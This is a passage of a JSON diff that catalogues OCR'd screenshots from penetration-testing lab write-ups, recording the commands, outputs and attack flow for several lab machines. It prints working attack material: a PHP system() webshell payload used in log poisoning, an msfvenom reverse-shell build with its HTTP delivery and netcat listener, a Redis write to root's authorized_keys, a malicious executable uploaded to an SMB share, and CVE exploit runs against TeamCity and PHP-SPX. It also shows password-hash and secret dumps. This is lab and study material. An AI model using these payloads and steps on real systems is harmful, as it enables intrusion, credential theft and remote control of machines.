+    "notes": "Terminal screenshot showing compilation and execution of CVE-2021-4034 (PwnKit) failing to escalate privileges, leaving the session as uid=33(www-data)."
+  },
+  {
+    "source": {
+      "url": "assets/illusion/capture-026-b8bf4767de.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "b8bf4767de90cc5fe6d99ecb2afd1c399e17df9fb1430b1388c93bb5780bda9c",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "ssh -i id_rsa root@192.168.151.203",
+        "tool": "ssh",
+        "raw_output": "Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)\nLast login: Tue Aug 22 05:54:28 2023 from 192.168.45.187\nroot@illusion:~# cat /root/proof.txt\n<redacted>\nroot@illusion:~# exit",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ssh.authenticated"
+      },
+      {
+        "kind": "access.root"
+      },
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "host.kernel"
+      },
+      {
+        "kind": "host.hostname"
+      },
+      {
+        "kind": "proof.captured"
+      },
+      {
+        "kind": "objective.flag_captured_root"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Redis CONFIG SET dir /root/.ssh + dbfilename authorized_keys",
+      "SSH key authentication as root@192.168.151.203",
+      "Capture /root/proof.txt"
+    ],
+    "notes": "Terminal screenshot showing root SSH login using the authorized_keys file written via Redis and reading /root/proof.txt on host illusion."
+  },
+  {
+    "source": {
+      "url": "assets/jordak/capture-001-dda90cbdc8.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "dda90cbdc891269cb9392e65d8763138dd7d038b16c196a1b28ea4670f2ee5ba",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "ffuf -u http://192.168.190.109/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+        "tool": "ffuf",
+        "raw_output": "Documents and Settings  [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 29ms]\nLICENSE                 [Status: 200, Size: 35181, Words: 5707, Lines: 662, Duration: 31m\napplication             [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 31ms]\nassets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 32ms]\ndocs                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 49ms]\nfavicon.ico             [Status: 200, Size: 113776, Words: 120, Lines: 87, Duration: 31ms\nrobots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3, Duration: 30ms]\nsql                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 35ms]\nsystem                  [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 29ms]\ntests                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 34ms]\nvendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 30ms]",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.paths"
+      },
+      {
+        "kind": "web.content_map"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "ffuf directory enumeration on port 80",
+      "/docs and CodeIgniter/Jorani directory discovery"
+    ],
+    "notes": "Cropped ffuf table (run without filtering 403s on space-containing DirBuster words) discovering /LICENSE, /assets, /docs, /sql, /tests, /vendor, /application, and /system."
+  },
+  {
+    "source": {
+      "url": "assets/jordak/capture-002-c4ad21adba.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "c4ad21adba849b0365d20a10b975fcf70b61ff9e8fd6ea3fec35f40bc610fd51",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python CVE_Jorani.py http://192.168.190.109",
+        "tool": "python",
+        "raw_output": "[?] Header used for exploit: UFDFPUQTKRXO\n[?] Requesting session cookie\n[?] Poisonning log file with payload: '<?php if(isset($_SERVER['HTTP_UFDFPUQTKRXO'])){system(base64_decode($_SERVER['HTTP_UFDFPUQTKRXO']));} ?>'\n[?] Set path traversal to '../../application/logs'\n[+] Recoveredd CSRF Token: <redacted>\n[?] Accessing log file: log-2024-12-06\njrjgjk@jorani(PSEUDO-TERM)\n$ whoami\n\njordak",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.lfi_confirmed"
+      },
+      {
+        "kind": "web.rce"
+      },
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Jorani CVE-2023-26469 unauthenticated log poisoning + path traversal",
+      "pseudo-terminal command execution as jordak"
+    ],
+    "notes": "Terminal screenshot showing CVE_Jorani.py poisoning `../../application/logs/log-2024-12-06` and executing `whoami` -> `jordak` without authentication."
+  },
+  {
+    "source": {
+      "url": "assets/jordak/capture-003-f816a3934c.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "f816a3934cdaee94d17b6b6883117c656e0f01f6f9b4999db007c75957f53301",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.228 LPORT=4444 -f elf > shell.elf",
+        "tool": "msfvenom",
+        "raw_output": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes",
+        "truncated": false,
+        "fidelity": "ocr"
+      },
+      {
+        "command_shown": "python -m http.server 8000",
+        "tool": "python",
+        "raw_output": "Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n192.168.190.109 - - [06/Dec/2024 12:12:24] \"GET /shell.elf HTTP/1.1\" 200 -",
+        "truncated": false,
+        "fidelity": "ocr"
+      },
+      {
+        "command_shown": "nc -lvnp 4444",
+        "tool": "nc",
+        "raw_output": "listening on [any] 4444 ...\nconnect to [192.168.45.228] from (UNKNOWN) [192.168.190.109] 50764\nwhoami\njordak\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\njordak@jordak:/var/www/html$ id\nuid=1000(jordak) gid=1000(jordak) groups=1000(jordak),27(sudo)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "privesc.sudo_group"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "msfvenom ELF payload generation",
+      "python http.server 8000 delivery",
+      "netcat reverse shell + PTY upgrade",
+      "id disclosing 27(sudo) membership"
+    ],
+    "notes": "Multi-step terminal capture showing ELF reverse shell staging and full interactive PTY upgrade revealing `groups=1000(jordak),27(sudo)`."
+  },
+  {
+    "source": {
+      "url": "assets/jordak/capture-004-69c1f72ace.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "69c1f72ace19045836c1c025a8dc0931689fd8477beb804977a1a36a6fe3269e",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "cat local.txt",
+        "tool": "cat",
+        "raw_output": "<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      },
+      {
+        "command_shown": "ifconfig",
+        "tool": "ifconfig",
+        "raw_output": "ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.190.109  netmask 255.255.255.0  broadcast 192.168.190.255\n        ether 00:50:56:9e:9f:18  txqueuelen 1000  (Ethernet)\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "objective.flag_located_user"
+      },
+      {
+        "kind": "proof.captured"
+      },
+      {
+        "kind": "scan.local.interfaces"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "local.txt user flag read",
+      "ifconfig local interface check"
+    ],
+    "notes": "Terminal screenshot showing `/home/jordak/local.txt` capture and `ifconfig` confirming single-homed `ens160` interface (`192.168.190.109/24`)."
+  },
+  {
+    "source": {
+      "url": "assets/nara/capture-002-8c2f7446c5.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "8c2f7446c5d6953baa0bd1457c1a912a4e715705b2ef9584984a7b8c8665e06d",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "smbclient //192.168.249.30/nara -U nara-security.com\\guest",
+        "tool": "smbclient",
+        "raw_output": "Password for [WORKGROUP\\nara-security.comguest]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> cd Documents\\\nsmb: \\Documents\\> put reverse.exe\nputting file reverse.exe as \\Documents\\reverse.exe (6.5 kb/s) (average 6.5 kb/s)\nsmb: \\Documents\\> ls\n  reverse.exe                         A    73802  Thu Dec 12 10:27:46 2024\n  test.odt                            A    10482  Thu Dec 12 10:15:47 2024\n  test2.odt                           A    10751  Thu Dec 12 10:22:39 2024\nsmb: \\Documents\\> cd ..\nsmb: \\> cd IT\nsmb: \\IT\\> put reverse.exe\nputting file reverse.exe as \\IT\\reverse.exe (223.1 kb/s) (average 12.7 kb/s)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "smb.guest_session"
+      },
+      {
+        "kind": "smb.writable_share"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "guest SMB write verification on //192.168.249.30/nara (\\Documents\\ and \\IT\\)",
+      ".exe/.odt non-trigger observation -> pivot to hashgrab coerced-auth files"
+    ],
+    "notes": "Terminal screenshot confirming guest write access to `\\Documents\\` and `\\IT\\` on the `nara` SMB share and showing `.exe`/`.odt` upload attempts prior to `.lnk`/`.scf`/`.url` NTLM coercion."
+  },
+  {
+    "source": {
+      "url": "assets/nara/capture-009-c5bffb6ee3.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "c5bffb6ee3ef748caeff568fc94e06018ef1f3193a6e84614875fafd93cc3ad2",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "dir; type automation.txt",
+        "tool": "evil-winrm",
+        "raw_output": "    Directory: C:\\Users\\tracy.white\\Documents\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         7/30/2023   3:05 PM            373 automation.txt\n\n*Evil-WinRM* PS C:\\Users\\tracy.white\\Documents> type automation.txt\nEnrollment Automation Account\n\n01000000d08c9ddf0115d1118c7a00c04fc297eb<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.files"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Evil-WinRM enumeration of C:\\Users\\tracy.white\\Documents",
+      "automation.txt DPAPI SecureString discovery (`01000000d08c9ddf...`)"
+    ],
+    "notes": "Evil-WinRM screenshot revealing filename `automation.txt` and header `Enrollment Automation Account` above a Windows DPAPI `ConvertFrom-SecureString` hex blob (`01000000d08c9ddf...`); filename and header are only in the screenshot."
+  },
+  {
+    "source": {
+      "url": "assets/nara/capture-010-dcacd3f2b2.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "dcacd3f2b2523a12e29d7057cfd211e832279959acfe96c59e6c9f70140667ae",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET https://www.google.com/search?q=how+to+decrypt+powershell+secure+string",
+        "tool": "browser",
+        "raw_output": "Stack Overflow: Decode System.Security.SecureString to readable password\n$password = ConvertTo-SecureString '<redacted>' -AsPlainText -Force",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [],
+    "failures": [],
+    "flow": [
+      "DPAPI SecureString format identification",
+      "StackOverflow Marshal::SecureStringToCoTaskMemUnicode lookup"
+    ],
+    "notes": "Attacker browser Google search screenshot for PowerShell SecureString decryption; carries operator research flow only and implies zero target facts."
+  },
+  {
+    "source": {
+      "url": "assets/plum/capture-001-432e09245e.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "432e09245e325453029846186ada3e3529421ee655c4f3d3da12515df84e155a",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://192.168.219.28/core/admin/statiques.php",
+        "tool": "browser",
+        "raw_output": "PluXml | admin : Administrator | PluXml 5.8.7\nCreate and edit static pages\n001 | Static 1 | static-1 | Yes | 1 | Display | Edit | See",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.cms"
+      },
+      {
+        "kind": "web.tech"
+      },
+      {
+        "kind": "web.fingerprint.pluxml"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "PluXml admin login (admin:<redacted>)",
+      "PluXml 5.8.7 sidebar version confirmation",
+      "Static pages -> Edit (001 Static 1) PHP RCE injection"
+    ],
+    "notes": "Authenticated PluXml admin console screenshot disclosing exact installed version `PluXml 5.8.7` in the left sidebar (prose cited a 5.8.9 advisory) and the Static pages `Edit` action used for PHP payload injection."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-001-c4062c3e35.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "c4062c3e35760bb471b3dd48d53fcc9a90267a1af8d77d8b9da4b81f5cfbd062",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "sudo nano /etc/hosts",
+        "tool": "nano",
+        "raw_output": "127.0.0.1       localhost\n192.168.102.91  teams.onlyrands.com",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.vhost"
+      },
+      {
+        "kind": "dns.a_record"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "HTTP redirect vhost discovery",
+      "/etc/hosts entry addition for teams.onlyrands.com"
+    ],
+    "notes": "Terminal editor capture mapping target IP to virtual host teams.onlyrands.com in /etc/hosts."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-002-029b0fe0e0.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "029b0fe0e09e97018ad8c21506573735cb80f80bb34c20a5c5274afed79c5ca7",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "POST http://teams.onlyrands.com/loginSubmit.html",
+        "tool": "browser",
+        "raw_output": "Log in to TeamCity\nIncorrect username or password.\nUsername: admin\nVersion 2023.05.4 (build 129421)",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.login_form"
+      },
+      {
+        "kind": "web.tech"
+      },
+      {
+        "kind": "service.version"
+      },
+      {
+        "kind": "blocker.logon_failure"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "blocker.logon_failure",
+        "error": "Incorrect username or password."
+      }
+    ],
+    "flow": [
+      "TeamCity login page enumeration",
+      "Default admin login rejection",
+      "Footer version disclosure Version 2023.05.4 (build 129421)"
+    ],
+    "notes": "Browser capture of TeamCity login page rejecting default credentials and disclosing Version 2023.05.4 (build 129421), which is absent from Markdown text and identifies CVE-2024-27198."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-004-e4168fe31d.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "e4168fe31d81eca082d4b1efb76d82441d5c27b7d75e0637a1efd80489ae8d27",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "cat database_dump/users",
+        "tool": "cat",
+        "raw_output": "ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM\n1, teamcity-admin, $2a$07$<redacted>, \"\", \"\"\n11, test, $2a$07$<redacted>, , test@mydomain\n24, admin, $2a$07$<redacted>, , admin@exampl",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "db.hashes"
+      },
+      {
+        "kind": "hash.candidate"
+      },
+      {
+        "kind": "web.users"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "TeamCity backup archive extraction",
+      "cat database_dump/users",
+      "bcrypt $2a$07$ user hash extraction"
+    ],
+    "notes": "Terminal output dumping TeamCity backup users CSV table containing bcrypt ($2a$07$) hashes; right margin wraps BCRYPT to RYPT."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-005-5510e6b0e8.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "5510e6b0e88af34554d7bd73677bbb8a5a491fdf636cd9d34a4991d04c79c4eb",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python CVE-2024-27198-RCE.py -t http://teams.onlyrands.com",
+        "tool": "python",
+        "raw_output": "[+] User added successfully, username: vba54cq4, password: <redacted>, user ID: 26\n[+] The target operating system version is linux\ncommand > whoami\n[-] Match failed. Response text:\nResponding with error, status code: 400 (Bad Request).\nDetails: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via \"rest.debug.proce",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.authz_bypass"
+      },
+      {
+        "kind": "credential.validated"
+      },
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "defense.control"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "rest_debug_processes_disabled",
+        "error": "Responding with error, status code: 400 (Bad Request). Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch"
+      }
+    ],
+    "flow": [
+      "CVE-2024-27198 admin user creation",
+      "/app/rest/debug/processes RCE attempt",
+      "HTTP 400 BadRequestException debug process launch disabled"
+    ],
+    "notes": "Terminal screenshot showing CVE-2024-27198 succeeding at admin account creation while failing RCE with HTTP 400 BadRequestException because TeamCity 2023.05+ disables rest.debug.processes by default."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-006-c16e44cca3.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "c16e44cca3306b64ff3a4c57d63a5ecadf664d8bc75ad8d583493281d9711e64",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "POST http://teams.onlyrands.com/admin/admin.html?item=diagnostics",
+        "tool": "teamcity-admin",
+        "raw_output": "Server Administration -> Diagnostics -> Troubleshooting\nDebug Logging\nActive logging preset: debug-all",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "config.review"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "wrong_debug_knob",
+        "error": "Active logging preset debug-all enables debug logs rather than internal property rest.debug.processes.enable"
+      }
+    ],
+    "flow": [
+      "TeamCity Diagnostics Troubleshooting panel",
+      "Active logging preset switched to debug-all",
+      "Debug process RCE still blocked"
+    ],
+    "notes": "Browser capture of TeamCity Server Administration Diagnostics page showing operator toggling Debug Logging preset to debug-all, which does not enable rest.debug.processes."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-007-36ddbde39f.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "36ddbde39f0923e7ad5e93bd0da866399c21e53a593eabfd6cdc221a9d9518d1",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://teams.onlyrands.com/ (Projects -> Freelancers -> Marco Tillman -> Build -> Pending Changes)",
+        "tool": "teamcity-admin",
+        "raw_output": "PROJECTS -> Freelancers -> Marco Tillman -> Build +10\nPending Changes 10:\nWORK - 8329519058 [...]\nOops [...]\nInit [...]",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.exposed_artifact"
+      },
+      {
+        "kind": "web.users"
+      },
+      {
+        "kind": "loot.files"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "TeamCity Freelancers project enumeration",
+      "Marco Tillman Build Pending Changes review",
+      "Oops commit inspection revealing SSH private key"
+    ],
+    "notes": "Browser capture of TeamCity build configuration Pending Changes tab highlighting Marco Tillman and commit 'Oops [...]' containing an encrypted SSH key."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-010-689af74bcd.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "689af74bcdde08e6038c8abb7cf4fd320220d286fa0ab004c36047d379f74a49",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "whoami; id; ls -la /home/freelancers; find / -iname 'local.txt' 2>/dev/null; cat /srv/git/local.txt; ifconfig",
+        "tool": "ssh",
+        "raw_output": "You have mail.\nuid=1012(marcot) gid=1004(freelancers) groups=1004(freelancers)\ndrwxrwx---+ 3 kathleenw freelancers 4096 Jun  7 09:34 kathleenw\ndrwxrwx---+ 5 marcot    freelancers 4096 Jun 13 04:30 marcot\ndrwxrwx---+ 3 matthewa  freelancers 4096 Jun  7 09:34 matthewa\n/srv/git/local.txt\n<redacted>\nens160: inet 192.168.102.91 netmask 255.255.255.0",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ssh.authenticated"
+      },
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "objective.flag_located_user"
+      },
+      {
+        "kind": "proof.captured"
+      },
+      {
+        "kind": "scan.local.interfaces"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "SSH foothold as marcot",
+      "You have mail login notice and POSIX ACL drwxrwx---+ home directory check",
+      "find / -iname local.txt locating /srv/git/local.txt",
+      "ifconfig interface check"
+    ],
+    "notes": "Terminal SSH foothold capture showing 'You have mail.', group gid=1004(freelancers), POSIX ACL '+' indicators on sibling home directories, and user flag retrieval from /srv/git/local.txt."
+  },
+  {
+    "source": {
+      "url": "assets/scrutiny/capture-011-6ddc8d766a.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "6ddc8d766a7b8ad17424fa0974bdf25defaa256c8ff4b74318201b62f1a3ff66",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "cat /etc/passwd | grep bash",
+        "tool": "cat",
+        "raw_output": "root:x:0:0:root:/root:/bin/bash\nedgarm:x:1001:1001:Edgar Macejkovic,,,:/home/administration/edgarm:/bin/bash\nbobbyp:x:1004:1002:Bobby Pfannerstill,,,:/home/operations/bobbyp:/usr/bin/bash\ndont:x:1007:1003:Don Tremblay,,,:/home/finance/dont:/usr/bin/bash\nmatthewa:x:1010:1004:Matthew Armstrong,,,:/home/freelancers/matthewa:/usr/bin/bash\nmarcot:x:1012:1004:Marco Tillman,,,:/home/freelancers/marcot:/usr/bin/bash\ngit:x:1015:1005:Git Server,,,:/srv/git:/bin/bash",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "config.review"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "/etc/passwd interactive shell filter",
+      "Departmental home directory structure enumeration"
+    ],
+    "notes": "Terminal capture of 'cat /etc/passwd | grep bash' enumerating 15 shell-enabled accounts grouped under /home/administration, /home/operations, /home/finance, /home/freelancers, and /srv/git."
+  },
+  {
+    "source": {
+      "url": "assets/spx/capture-001-72d0360964.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "72d0360964e91c0336c8473081ca0d2cc001a162376b3a0cb0afba25b0691277",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://192.168.192.108/phpinfo.php",
+        "tool": "browser",
+        "raw_output": "SPX\nSPX Support: enabled\nSPX Version: 0.4.15",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.exposed_artifact"
+      },
+      {
+        "kind": "web.tech"
+      },
+      {
+        "kind": "service.version"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "/phpinfo.php discovery",
+      "PHP-SPX 0.4.15 extension fingerprint"
+    ],
+    "notes": "Cropped browser capture of /phpinfo.php disclosing enabled PHP-SPX extension version 0.4.15 (vulnerable to CVE-2024-42007)."
+  },
+  {
+    "source": {
+      "url": "assets/spx/capture-002-e60d94c54b.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "e60d94c54b30f635a15271b02107d8d564049ee488f9f29cc5b2873bd5042f1a",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "go run exploit.go -t http://192.168.192.108/ -f /etc/passwd",
+        "tool": "go",
+        "raw_output": "[-] The target isn't vulnerable to CVE-2024-42007.",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "exploit.candidate"
+      },
+      {
+        "kind": "blocker.access_denied"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "hardcoded_poc_auth_key",
+        "error": "[-] The target isn't vulnerable to CVE-2024-42007."
+      }
+    ],
+    "flow": [
+      "Unmodified CVE-2024-42007 Go PoC execution",
+      "False-negative vulnerability check due to default SPX_KEY=dev"
+    ],
+    "notes": "Terminal screenshot showing an unmodified public CVE-2024-42007 Go exploit returning a false-negative result because SPX_KEY defaults to 'dev' in the script."
+  },
+  {
+    "source": {
+      "url": "assets/spx/capture-003-c6bbccfdb7.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "c6bbccfdb76e65d3607ead2708abaadc4c8114ed85958c5d609bcc29553243b1",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "cat exploit.go",
+        "tool": "cat",
+        "raw_output": "exploit(targetUrl string, fileToRead string, detectionString string) string {\n    vulnUrl := targetUrl + \"/?SPX_KEY=dev&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "config.review"
+      },
+      {
+        "kind": "web.param_candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "PoC source code review",
+      "Identification of hardcoded SPX_KEY=dev query parameter"
+    ],
+    "notes": "Terminal code snippet of exploit.go revealing the hardcoded SPX_KEY=dev query string parameter causing the initial exploit failure."
+  },
+  {
+    "source": {
+      "url": "assets/spx/capture-004-69c1af6735.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "69c1af673592f8ea220c0447397afe6a6329c8074671e962795bf67d63e461d7",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://192.168.192.108/phpinfo.php",
+        "tool": "browser",
+        "raw_output": "Directive | Local Value | Master Value\nspx.data_dir | /tmp/spx | /tmp/spx\nspx.http_enabled | 1 | 1\nspx.http_ip_whitelist | * | *\nspx.http_key | <redacted> | <redacted>\nspx.http_ui_assets_dir | /usr/share/misc/php-spx/assets/web-ui | /usr/share/misc/php-spx/assets/web-ui",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.exposed_artifact"
+      },
+      {
+        "kind": "credential.plaintext"
+      },
+      {
+        "kind": "config.review"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "/phpinfo.php directive inspection",
+      "spx.http_key secret extraction alongside spx.http_ip_whitelist=*"
+    ],
+    "notes": "Browser capture of /phpinfo.php SPX directives table disclosing spx.http_key, spx.http_enabled=1, and spx.http_ip_whitelist=*."
+  },
+  {
+    "source": {
+      "url": "assets/spx/capture-005-69cd12f7ff.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "69cd12f7ff901078fbcd1399d3d48835be225d43fde8ec7abb930b3b6f87b618",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "nano exploit.go",
+        "tool": "nano",
+        "raw_output": "func exploit(targetUrl string, fileToRead string, detectionString string) string {\n    vulnUrl := targetUrl + \"/?SPX_KEY=<redacted>&SPX_UI_URI=%2f..%\n    req, err := http.NewRequest(\"GET\", vulnUrl, nil)",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "exploit.candidate"
+      },
+      {
+        "kind": "credential.available"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "PoC parameter repair substituting spx.http_key into SPX_KEY",
+      "Authenticated CVE-2024-42007 path traversal file read"
+    ],
+    "notes": "Terminal editor capture showing exploit.go updated with the leaked spx.http_key value from phpinfo.php prior to arbitrary file read."
+  },
+  {
+    "source": {
+      "url": "assets/symbolic/capture-001-4dd81ad550.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "4dd81ad550c41fcdcd3d1e9a1ad6817a0a27509a87821eccfe0ba9c99096327d",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
